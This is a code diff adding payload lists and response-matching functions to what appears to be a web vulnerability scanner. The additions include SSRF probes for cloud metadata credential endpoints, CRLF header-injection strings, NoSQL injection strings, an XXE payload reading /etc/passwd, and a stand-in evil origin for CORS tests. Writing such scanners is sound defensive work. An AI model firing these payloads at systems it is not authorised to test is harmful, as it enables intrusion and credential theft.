@@ -138,3 +138,111 @@ def ssti_payloads(a: int, b: int, left: str, right: str) -> list[str]:
 
 def ssti_expected(a: int, b: int, left: str, right: str) -> str:
     return f"{left}{a * b}{right}"
+
+
+SSRF_PARAM_NAMES = {
+    "url", "uri", "u", "link", "src", "source", "target", "dest", "destination",
+    "redirect", "redirect_uri", "callback", "webhook", "fetch", "load", "page",
+    "path", "file", "host", "site", "domain", "feed", "proxy", "img", "image",
+    "open", "data", "reference", "ref", "remote", "endpoint",
+}
+
+SSRF_METADATA_PAYLOADS = [
+    "http://169.254.169.254/latest/meta-data/",
+    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+    "http://metadata.google.internal/computeMetadata/v1/",
+    "http://[::ffff:169.254.169.254]/latest/meta-data/",
+]
+
+SSRF_METADATA_SIGNATURES = [
+    re.compile(p, re.IGNORECASE)
+    for p in [
+        r"\bami-id\b",
+        r"\binstance-id\b",
+        r"\biam/\b",
+        r"security-credentials",
+        r"computeMetadata",
+        r"\bplacement/\b",
+    ]
+]
+
+SSRF_CANARY_PAYLOAD = "http://example.com/"
+SSRF_CANARY_SIGNATURES = ["Example Domain", "illustrative examples"]
+
+
+def match_ssrf_metadata(body: str) -> str:
+    if not body:
+        return ""
+    for sig in SSRF_METADATA_SIGNATURES:
+        if sig.search(body):
+            return sig.pattern
+    return ""
+
+
+def match_ssrf_canary(body: str) -> bool:
+    return bool(body) and any(sig in body for sig in SSRF_CANARY_SIGNATURES)
+
+
+def crlf_payloads(token: str):
+    name = f"X-Wvs-{token}"
+    value = token
+    return [
+        (f"%0d%0a{name}:{value}", name, value),
+        (f"%0D%0A{name}:{value}", name, value),
+        (f"wvs%0d%0a{name}:{value}", name, value),
+        (f"\r\n{name}:{value}", name, value),
+    ]
+
+
+NOSQLI_PAYLOADS = [
+    "' || '1'=='1",
+    '" || "1"=="1',
+    "';return true;//",
+    "[$ne]=wvs",
+    '{"$gt":""}',
+]
+
+NOSQL_ERROR_SIGNATURES = [
+    re.compile(p, re.IGNORECASE)
+    for p in [
+        r"mongo(db)?error",
+        r"\bbson\b",
+        r"\$where",
+        r"e11000",
+        r"couldn't parse",
+        r"cast to objectid failed",
+        r"unexpected token .*? in json",
+    ]
+]
+
+
+def match_nosql_error(body: str) -> str:
+    if not body:
+        return ""
+    for sig in NOSQL_ERROR_SIGNATURES:
+        m = sig.search(body)
+        if m:
+            return m.group(0)
+    return ""
+
+
+def xxe_payload() -> str:
+    return (
+        '<?xml version="1.0"?>'
+        '<!DOCTYPE wvs [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
+        "<wvs>&xxe;</wvs>"
+    )
+
+
+CORS_EVIL_ORIGIN = "https://wvs-evil.example"
+
+HOST_EVIL = "wvs-evil.example"
+
+DANGEROUS_METHODS = {"PUT", "DELETE", "TRACE", "PATCH", "CONNECT"}
+
+GUESSABLE_PARAMS = [
+    "id", "page", "file", "path", "url", "q", "search", "query", "name",
+    "lang", "view", "action", "cat", "category", "dir", "include", "doc",
+    "item", "p", "type", "redirect", "next", "callback", "user", "template",
+    "load", "read", "src", "ref", "data",
+]
